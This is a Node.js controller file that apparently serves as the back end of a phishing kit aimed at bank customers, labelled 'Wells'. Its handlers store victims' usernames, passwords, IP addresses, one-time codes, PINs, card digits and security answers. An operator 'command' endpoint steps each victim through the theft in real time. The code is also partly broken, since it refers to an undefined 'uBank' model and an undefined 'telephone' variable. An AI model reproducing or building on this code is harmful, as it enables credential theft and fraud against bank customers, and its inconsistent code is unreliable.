const Wells = require("../models/wellsModel");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Wells.find({ owner })
    .sort({ status: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status } = req.body;
  try {
    await Wells.findOneAndUpdate({ uniqueid }, { status }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Wells.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { username, password, uniqueid, owner, ip } = req.body;
  try {
    await Wells.create({ uniqueid, username, password, status: 2, owner, ip });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { username, password, uniqueid } = req.body;
  try {
    await Wells.findOneAndUpdate({ uniqueid }, { telephone, status: 9 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitPin = async (req, res) => {
  const { pin, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { pin, status: 5 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLast4 = async (req, res) => {
  const { last4, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { last4, status: 4 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitSecAnswer = async (req, res) => {
  const { secAnswer, uniqueid } = req.body;
  try {
    await uBank
      .findOneAndUpdate({ uniqueid }, { secAnswer, status: 11 })
      .exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitPassword = async (req, res) => {
  const { password, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { password, status: 13 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await uBank.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitPin,
  submitLast4,
  deleteEntry,
  submitPassword,
  submitSecAnswer,
};
